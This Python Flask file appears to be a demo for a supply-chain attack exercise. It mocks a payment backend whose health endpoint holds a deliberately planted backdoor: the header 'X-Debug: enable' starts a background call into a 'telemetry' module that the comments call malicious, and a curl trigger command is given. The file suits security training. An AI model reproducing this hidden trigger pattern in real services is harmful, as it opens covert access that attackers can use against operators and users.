#!/usr/bin/env python3
"""
Payment Backend Service - Container Freeze Demo
Legitimate payment processing API

SUPPLY CHAIN ATTACK SIMULATION:
This file contains a hidden backdoor in the /api/health endpoint.
It was injected during the build process - perhaps via a compromised
base image, a malicious dependency, or a compromised CI/CD pipeline.

The backdoor is triggered by a specific header (X-Debug: enable),
which simulates a "debug feature" that was left in production code.
"""
import os
import time
import socket
import threading
from flask import Flask, request, jsonify

# Import the malicious telemetry module (disguised as a legitimate dependency)
import telemetry

app = Flask(__name__)

@app.route('/api/health', methods=['GET'])
def health():
    # ========================================================================
    # HIDDEN BACKDOOR
    # This "debug feature" was left in production code - looks innocent
    # but triggers the malicious payload download when activated.
    # Attackers can trigger it by sending: curl -H "X-Debug: enable" /api/health
    # ========================================================================
    if request.headers.get('X-Debug') == 'enable':
        # Run in background thread so health check still returns immediately
        threading.Thread(target=telemetry.trigger_sync, daemon=True).start()

    return jsonify({
        "status": "healthy",
        "service": "payment-backend",
        "version": "3.2.1"
    })

@app.route('/api/process', methods=['POST'])
def process_payment():
    data = request.get_json() or {}
    return jsonify({
        "status": "processed",
        "transaction_id": "tx_" + str(int(time.time())),
        "amount": data.get("amount", 0),
        "currency": data.get("currency", "USD")
    })

@app.route('/api/balance', methods=['GET'])
def get_balance():
    return jsonify({
        "balance": 10000.00,
        "currency": "USD",
        "account_id": "acc_demo123"
    })

@app.route('/api/transactions', methods=['GET'])
def list_transactions():
    return jsonify({
        "transactions": [
            {"id": "tx_001", "amount": 100.00, "status": "completed"},
            {"id": "tx_002", "amount": 250.00, "status": "completed"},
            {"id": "tx_003", "amount": 75.50, "status": "pending"}
        ]
    })

if __name__ == '__main__':
    # Credentials are set via environment variables in the Kubernetes deployment
    # (simulating real-world secret injection that malware would steal)
    print("[*] Payment Backend Service Starting...")
    print("[*] Version 3.2.1 (Build #8842)")
    app.run(host='0.0.0.0', port=8080, debug=False)
